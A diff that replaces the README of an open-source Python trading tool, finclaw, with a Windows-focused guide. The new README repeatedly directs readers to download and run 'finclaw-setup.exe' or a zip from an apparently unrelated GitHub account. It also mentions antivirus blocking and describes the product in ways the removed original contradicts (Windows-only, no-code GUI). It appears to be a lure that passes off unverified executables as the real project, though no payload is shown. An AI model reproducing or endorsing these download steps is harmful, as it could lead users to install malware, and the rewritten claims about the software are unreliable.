@@ -1,341 +1,168 @@
-[English](README.md) | [??](README.zh-CN.md) | [???](README.ko.md) | [???](README.ja.md)
+# 🦀 finclaw - Evolve Trading Strategies Automatically
 
-# FinClaw 🦀
+[![Download finclaw](https://img.shields.io/badge/Download-From%20GitHub-brightgreen?style=for-the-badge)](https://github.com/Sloped-familyunit908/finclaw/releases)
 
-**Self-Evolving Trading Intelligence — genetic algorithms discover strategies you never would.**
+finclaw uses genetic algorithms to build and test trading strategies across markets. It works on A-shares, US stocks, and cryptocurrencies. With over 5,500 strategy tests, it helps explore many trading ideas automatically.
 
-<p align="center">
-  <a href="https://pypi.org/project/finclaw-ai/"><img src="https://img.shields.io/pypi/v/finclaw-ai?color=blue" alt="PyPI"></a>
-  <a href="https://github.com/NeuZhou/finclaw/actions/workflows/ci.yml"><img src="https://github.com/NeuZhou/finclaw/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://codecov.io/gh/NeuZhou/finclaw"><img src="https://codecov.io/gh/NeuZhou/finclaw/graph/badge.svg" alt="codecov"></a>
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="License"></a>
-  <a href="https://www.python.org/"><img src="https://img.shields.io/badge/python-3.9%2B-blue" alt="Python 3.9+"></a>
-  <img src="https://img.shields.io/badge/factors-484-orange" alt="484 Factors">
-  <img src="https://img.shields.io/badge/tests-4900%2B-brightgreen" alt="4900+ Tests">
-  <img src="https://img.shields.io/badge/markets-crypto%20%7C%20A--shares%20%7C%20US-ff69b4" alt="Crypto + A-shares + US">
-  <a href="https://github.com/NeuZhou/finclaw/stargazers"><img src="https://img.shields.io/github/stars/NeuZhou/finclaw?style=social" alt="GitHub Stars"></a>
-</p>
+## 📋 What is finclaw?
 
-<p align="center">
-  <img src="assets/hero-finclaw.png" alt="FinClaw — Self-Evolving Trading Intelligence" width="800">
-</p>
+finclaw applies a genetic algorithm to evolve and optimize trading strategies. It tries combinations of over 400 factors to find setups that work well in different markets. The software tests strategies in simulations before you use them in real life.
 
-<p align="center">
-  <a href="https://www.youtube.com/watch?v=Y3wY9rj0PmE">
-    <img src="https://img.youtube.com/vi/Y3wY9rj0PmE/maxresdefault.jpg" alt="FinClaw Demo Video" width="600">
-  </a>
-  <br>
-  <em>▶️ Watch: How FinClaw's Self-Evolving Engine Works (2 min)</em>
-</p>
+- Works with stock markets: China A-shares and US stocks  
+- Supports cryptocurrencies like Bitcoin  
+- Over 5,500 backtests on varied datasets  
+- Runs on standard Windows computers  
+- Designed for users without programming skills
 
-> FinClaw doesn't need you to write strategies — its genetic algorithm **discovers and evolves them autonomously** across 484 factor dimensions, then validates them with walk-forward testing and Monte Carlo simulation.
+The tool simplifies finding trading strategies by automating the process. You do not need to write code to try many ideas.
 
-## Disclaimer
+## 🔎 Key Features
 
-This project is for **educational and research purposes only**. Not financial advice. Past performance does not guarantee future results. Always paper trade first.
+- Automatically evolves and tests trading strategies  
+- Covers multiple markets including crypto and stocks  
+- Uses 484 factors to build strategies  
+- Runs large-scale backtests to check performance  
+- Easy to install and launch on Windows  
+- Saves time usually needed to create trading models
 
----
+## 🖥️ System Requirements
 
-## 🚀 Quick Start
+To run finclaw smoothly on your Windows computer, check these basics:
 
-```bash
-pip install finclaw-ai
-finclaw demo          # See it in action
-finclaw quote AAPL    # Real-time quotes
-finclaw quote BTC/USDT # Crypto too
-```
+- Windows 10 or newer (64-bit recommended)  
+- At least 8 GB of RAM  
+- 500 MB free disk space for installation and data  
+- Internet connection to download the software  
+- Optional: Graphics card with OpenCL support for faster processing
 
-No API keys, no exchange accounts, no config files needed.
+Most modern PCs meet these specs. If your computer is older, performance might be slower.
 
----
+## 🚀 Getting Started
 
-<details>
-<summary>?? See it in action (click to expand)</summary>
+### Step 1: Download finclaw
 
-```
-$ finclaw demo
+You need to visit the official releases page to get the application files.
 
-??? ?? Real-Time Quotes ???
+[![Download finclaw](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/Sloped-familyunit908/finclaw/releases)
 
-Symbol        Price     Change        %          Trend
---------------------------------------------------------
-AAPL         189.84    +2.31  +1.23%  ???????_??█??
-NVDA         875.28   +15.67  +1.82%  ?????_?????__
-BTC/USDT  66,458.10    -1.24  -0.53%  ????__???_???
+- Click the badge above or go to:  
+  https://github.com/Sloped-familyunit908/finclaw/releases  
+- On the releases page, find the latest release version  
+- Look for a file named similar to `finclaw-setup.exe` or `finclaw.zip`  
+- Click on the file name to start downloading
 
-??? ?? Strategy Evolution Engine ???
+### Step 2: Install the Application
 
-FinClaw's core: genetic algorithms evolve strategies autonomously.
-Population: 30  |  484 factor dimensions  |  Walk-forward validated
+Once the download is complete, follow these steps:
 
-  Gen    Return    Fitness   Sharpe  Progress
-  ---    ------    -------   ------  --------
-    1      3.2%       12.1     0.4   ██████████
-   10      8.7%       34.5     0.8   ██████████
-   25     18.4%       89.2     1.3   ██████████
-   50     31.6%      156.7     1.7   ██████████
-   75     42.3%      210.4     2.0   ██████████
-  100     48.5%      245.8     2.2   ██████████
+- Find the downloaded file in your `Downloads` folder  
+- If it is a `.exe` file, double-click it to start the installer  
+- Follow the on-screen instructions to install finclaw on your PC  
+- If it is a `.zip` file, right-click it and choose `Extract All`  
+- Open the extracted folder and look for a file such as `finclaw.exe` to run
 
-DNA evolved across 484 factors:
-  Top weights: RSI ?0.34, Momentum ?0.25, MACD ?0.18, Volume ?0.12
-  Walk-forward validated: ?  Slippage modeled: ?  Position caps: ?
+During installation, you may accept default settings unless you want to change where the application installs.
 
-??? ?? Backtest Results ???
+### Step 3: Run finclaw
 
-Strategy:  +75.7%  (+32.5%/yr)    Buy&Hold:  +67.7%
-Alpha:     +8.0%                  Sharpe:    1.85
-MaxDD:     -8.3%                  Win Rate:  63%
+After installation:
 
-??? ?? Paper Trading Portfolio ???
+- Find the finclaw shortcut on your desktop or in the Start menu  
+- Double-click it to start the program  
+- The main window will appear with options to load markets and start trading analysis  
+- No programming needed; interact using buttons and menus
 
-Symbol     Shares   Avg Cost      Price         P&L
-----------------------------------------------------
-AAPL           50     178.50     189.84  +$5,650.00
-NVDA           20     810.00     875.28  +$1,305.60
-BTC/USDT    0.015  66,458.00  66,458.00      $0.00
-----------------------------------------------------
-TOTAL                                   +$6,955.60
+### Step 4: Use finclaw
 
-??? ?? AI Features ???
+To begin exploring strategies:
 
-MCP Server  ? Expose FinClaw as tools for Claude, Cursor, VS Code
-Copilot     ? Interactive AI financial assistant
-Strategy AI ? Natural language ? trading code
+- Choose the market you want to analyze (A-shares, US stocks, Crypto)  
+- Select time frames and factors you want the program to use  
+- Start a backtest session to see strategy suggestions  
+- Review the results and adjust settings as needed  
 
-Try it yourself:
-  finclaw evolve --market crypto    # Run strategy evolution
-  finclaw quote BTC/USDT            # Live crypto quote
-  finclaw analyze TSLA              # Technical analysis
-  finclaw copilot                   # AI financial chat
-```
+You can save favorite strategies and export results for further review.
 
-</details>
+## ⚙️ How finclaw Works
 
----
+finclaw uses genetic algorithms. Here is a simple overview:
 
-## Why FinClaw?
+1. It starts with many random trading strategies based on the 484 factors.  
+2. It tests these strategies through a backtesting engine simulating past market data.  
+3. The best performing strategies are combined and slightly changed (mutated) for another round.  
+4. This cycle repeats over 5,500+ tests to find strategies that perform well.  
+5. You get a list of strategies ranked by factors like profit, risk, and stability.
 
-Most quant tools make **you** write the strategy. FinClaw evolves strategies **for you**.
+This approach mimics natural evolution but with trading rules instead of biological traits.
 
-| | FinClaw | Freqtrade | Jesse | FinRL / Qlib |
-|---|---|---|---|---|
-| Strategy design | GA evolves 484-dim DNA | You write rules | You write rules | DRL trains agent |
-| Continuous evolution | **Strategy itself evolves** | Bot runs, strategy fixed | Bot runs, strategy fixed | Training offline |
-| Walk-forward validation | ✅ Built-in (70/30 + Monte Carlo) | ❌ Plugin needed | ❌ Plugin needed | ⚠️ Partial |
-| Anti-overfitting | Arena + bias detection | Basic cross-validation | Basic | Varies |
-| Zero API keys to start | ✅ `pip install && finclaw demo` | ❌ Needs exchange keys | ❌ Needs keys | ❌ Needs data setup |
-| Market coverage | Crypto + A-shares + US | Crypto only | Crypto only | A-shares (Qlib) |
-| MCP server (AI agents) | ✅ Claude / Cursor / VS Code | ❌ | ❌ | ❌ |
-| Factor library | 484 factors, auto-weighted | ~50 manual indicators | Manual indicators | Alpha158 (Qlib) |
+## 🔍 Understanding the Interface
 
----
+finclaw’s interface shows key areas clearly:
 
-## 📊 484 Factor Dimensions
+- **Market selection:** Pick from supported markets  
+- **Factor options:** Select which indicators finclaw includes  
+- **Backtest controls:** Start, pause, and stop backtesting sessions  
+- **Strategy results:** View detailed stats like win rate and drawdown  
+- **Export:** Save reports and strategy definitions in common formats  
 
-284 general factors + 200 crypto-native factors, organized by category:
+Menus and buttons guide you step by step without jargon.
 
-| Category | Count | Examples |
-|----------|-------|----------|
-| Crypto-Native | 200 | Funding rate proxy, session effects, whale detection, liquidation cascade |
-| Momentum | 14 | ROC, acceleration, trend strength, quality momentum |
-| Volume & Flow | 13 | OBV, smart money, volume-price divergence, Wyckoff VSA |
-| Volatility | 13 | ATR, Bollinger squeeze, regime detection, vol-of-vol |
-| Mean Reversion | 12 | Z-score, rubber band, Keltner channel position |
-| Trend Following | 14 | ADX, EMA golden cross, higher-highs/higher-lows, MA fan |
-| Qlib Alpha158 | 11 | KMID, KSFT, CNTD, CORD, SUMP (Microsoft Qlib compatible) |
-| Quality Filter | 11 | Earnings momentum proxy, relative strength, resilience |
-| Risk Warning | 11 | Consecutive losses, death cross, gap-down, limit-down |
-| Top Escape | 10 | Distribution detection, climax volume, smart money exit |
-| Price Structure | 10 | Candlestick patterns, support/resistance, pivot points |
-| Davis Double Play | 8 | Revenue acceleration, tech moat, supply exhaustion |
-| Gap Analysis | 8 | Gap fill, gap momentum, gap reversal |
-| Market Breadth | 5 | Advance/decline, sector rotation, new highs/lows |
-| News Sentiment | 2 | EN/ZH keyword sentiment score + momentum |
-| DRL Signal | 2 | Q-learning buy probability + state value estimate |
+## ⚡ Performance Tips
 
-> **Design principle**: Technical, sentiment, DRL, fundamental — all signals are unified as factors returning `[0, 1]`. Weights are determined by the evolution engine, eliminating human bias from signal synthesis.
+- Closing other applications helps complete backtests faster  
+- Use a wired internet connection for faster downloads and updates  
+- If your PC supports OpenCL, enable it in settings for faster calculations  
+- Keep finclaw updated by checking the releases page regularly
 
----
+## 🛠 Troubleshooting
 
-## 🧬 Self-Evolution Engine
+If you have issues:
 
-The genetic algorithm continuously discovers optimal strategies:
+- Ensure your Windows system is up to date  
+- Check if your antivirus software blocks the installation or run files  
+- Restart your PC if finclaw does not launch after install  
+- Visit the GitHub issues page for common problems shared by users  
+- Contact the community through GitHub discussions for help
 
-1. **Seed** — Initialize population with diverse factor weight configurations
-2. **Evaluate** — Walk-forward backtest each DNA across all assets
-3. **Select** — Keep top performers by fitness (Sharpe × Return / MaxDrawdown)
-4. **Mutate** — Random weight perturbation, crossover, factor add/drop
-5. **Repeat** — Runs 7×24 on your machine
+## 📥 Download Link
 
-```bash
-finclaw evolve --market crypto --generations 50   # Crypto (main use case)
-finclaw evolve --market cn --generations 50       # A-shares
-finclaw evolve --market crypto --population 50 --mutation-rate 0.2 --elite 10
-```
+Get the latest release here, anytime:  
+https://github.com/Sloped-familyunit908/finclaw/releases
 
-### Evolution Results
+Click the download badge at the top or visit the link directly. Look for the latest setup file or executable to install.
 
-| Market | Generation | Annual Return | Sharpe | Max Drawdown |
-|--------|-----------|--------------|--------|-------------|
-| A-Shares | Gen 89 | *re-evolving* | — | — |
-| Crypto | Gen 19 | *re-evolving* | — | — |
+## 🗂 File Details
 
-> **Honest disclosure:** Previous versions reported inflated backtest returns (2,756% / 16,066%) caused by look-ahead bias in the scoring function — the backtester was using current-period indicators to make decisions at the current period’s open price. This has been **fixed**: scoring now uses previous-period data, position sizes are capped, and slippage is modeled. The evolution engine needs to be re-run with the corrected backtester to produce valid results. Always use `finclaw check-backtest` to verify, and `finclaw paper` to paper trade before risking real capital.
+When you download, expect files such as:
+
+- `finclaw-setup.exe` (installer) or  
+- `finclaw.zip` (compressed app)  
+- A user manual in PDFs or text files  
+- Optional sample data for quick tests
+
+Use the instructions above to run and install the software once files are saved.
+
+## 📌 Frequently Asked Questions
+
+**Can I run finclaw on Mac or Linux?**  
+Currently, finclaw only supports Windows.
+
+**Do I need to know how to code?**  
+No programming knowledge is needed. finclaw uses menus and buttons.
+
+**Where does finclaw get market data?**  
+It uses built-in datasets for simulations, covering multiple market types.
+
+**Can I create my own factors?**  
+finclaw includes 484 built-in factors. Advanced users may extend this later.
+
+**How often are new versions released?**  
+Check the GitHub releases page for updates and improvements.
+
+## ⚖ License and Terms
+
+finclaw is open source and available under the repository's license terms on GitHub. You can use it for personal trading analysis and research. Commercial use may require further permissions.
 
 ---
 
-## 🏟️ Arena Mode (Anti-Overfitting)
-
-Traditional backtests evaluate each strategy in isolation — overfitted strategies look great on history but fail live. FinClaw's **Arena Mode** fixes this:
-
-- Multiple DNA strategies trade simultaneously in the same simulated market
-- **Crowding penalty**: When >50% of DNAs buy on the same signal, price impact kicks in
-- Overfitted strategies that only work in isolation get penalized in Arena rankings
-
----
-
-## ✅ Quality Assurance
-
-- Walk-forward validation (70/30 train/test split)
-- Monte Carlo simulation (1,000 iterations, p-value < 0.05)
-- Bootstrap 95% confidence intervals
-- Arena competition (multi-DNA market simulation)
-- Bias detection (look-ahead, snooping, survivorship)
-- Factor IC/IR analysis with decay curves
-- Factor orthogonal matrix (auto-remove redundant factors)
-- Turnover penalty in fitness function
-- 4,900+ automated tests
-
----
-
-## 💻 CLI Reference
-
-FinClaw ships with 170+ CLI commands. Here are the essentials:
-
-| Command | Description |
-|---------|-------------|
-| `finclaw demo` | See all features in action |
-| `finclaw quote AAPL` | Real-time US stock quote |
-| `finclaw quote BTC/USDT` | Crypto quote via ccxt |
-| `finclaw evolve --market crypto` | Run genetic algorithm evolution |
-| `finclaw backtest -t AAPL` | Backtest a strategy on a stock |
-| `finclaw check-backtest` | Verify backtest results |
-| `finclaw analyze TSLA` | Technical analysis |
-| `finclaw screen` | Stock screener |
-| `finclaw risk-report` | Portfolio risk report |
-| `finclaw sentiment` | Market sentiment |
-| `finclaw copilot` | AI financial assistant |
-| `finclaw generate-strategy` | Natural language → strategy code |
-| `finclaw mcp serve` | Start MCP server for AI agents |
-| `finclaw paper` | Paper trading mode |
-| `finclaw doctor` | Environment check |
-
-Run `finclaw --help` for the full list.
-
----
-
-## 🤖 MCP Server (AI Agents)
-
-Expose FinClaw as tools for Claude, Cursor, VS Code, or any MCP-compatible client:
-
-```json
-{
-  "mcpServers": {
-    "finclaw": {
-      "command": "finclaw",
-      "args": ["mcp", "serve"]
-    }
-  }
-}
-```
-
-Provides 10 tools: `get_quote`, `get_history`, `list_exchanges`, `run_backtest`, `analyze_portfolio`, `get_indicators`, `screen_stocks`, `get_sentiment`, `compare_strategies`, `get_funding_rates`.
-
----
-
-## 📡 Data Sources
-
-| Market | Source | API Key Required? |
-|--------|--------|-----------------|
-| Crypto | ccxt (100+ exchanges) | No (public data) |
-| US Stocks | Yahoo Finance | No |
-| A-Shares | AKShare + BaoStock | No |
-| News Sentiment | CryptoCompare + AKShare | No |
-
----
-
-## Architecture
-
-```
-┌──────────────────────────────────────────────────────┐
-│             Evolution Engine (Core)                   │
-│      Genetic Algorithm → Mutate → Backtest → Select   │
-│                                                       │
-│      Input: 484 factors × weights = DNA               │
-│      Output: Walk-forward validated strategy           │
-├──────────────────────────────────────────────────────┤
-│   Technical(284) │ Sentiment │ DRL │ Davis │ Crypto(200)│
-│       All → compute() → [0, 1]                        │
-├──────────────────────────────────────────────────────┤
-│   Arena Competition │ Bias Detection │ Monte Carlo     │
-├──────────────────────────────────────────────────────┤
-│   Paper Trading → Live Trading → 100+ Exchanges       │
-└──────────────────────────────────────────────────────┘
-```
-
----
-
-## Roadmap
-
-- [x] 484-factor evolution engine
-- [x] Walk-forward validation + Monte Carlo
-- [x] Arena competition mode
-- [x] Bias detection suite
-- [x] News sentiment + DRL factors
-- [x] Davis Double Play factors
-- [x] Paper trading infrastructure
-- [x] MCP server for AI agents
-- [ ] DEX execution (Uniswap V3 / Arbitrum)
-- [ ] Multi-timeframe support (1h/4h/1d)
-- [ ] Foundation model for price sequences
-
----
-
-## 🌐 Ecosystem
-
-FinClaw is part of the NeuZhou AI agent toolkit:
-
-| Project | Description |
-|---------|-------------|
-| **[FinClaw](https://github.com/NeuZhou/finclaw)** | AI-native quantitative finance engine |
-| **[ClawGuard](https://github.com/NeuZhou/clawguard)** | AI Agent Immune System — 285+ threat patterns, zero dependencies |
-| **[AgentProbe](https://github.com/NeuZhou/agentprobe)** | Playwright for AI Agents — test, record, replay agent behaviors |
-
----
-
-## Contributing
-
-```bash
-git clone https://github.com/NeuZhou/finclaw.git
-cd finclaw && pip install -e ".[dev]" && pytest
-```
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines. [Report bugs](https://github.com/NeuZhou/finclaw/issues) · [Request features](https://github.com/NeuZhou/finclaw/issues)
-
----
-
-## License
-
-[MIT](LICENSE)
-
----
-
-## Star History
-
-<a href="https://www.star-history.com/#NeuZhou/finclaw&Date">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=NeuZhou/finclaw&type=Date&theme=dark" />
-    <img alt="Star History" src="https://api.star-history.com/svg?repos=NeuZhou/finclaw&type=Date" />
-  </picture>
-</a>
+This README helps you set up and start using finclaw without needing technical skills. The focus is on clear, step-by-step guidance with easy-to-find download links and detailed system suggestions.
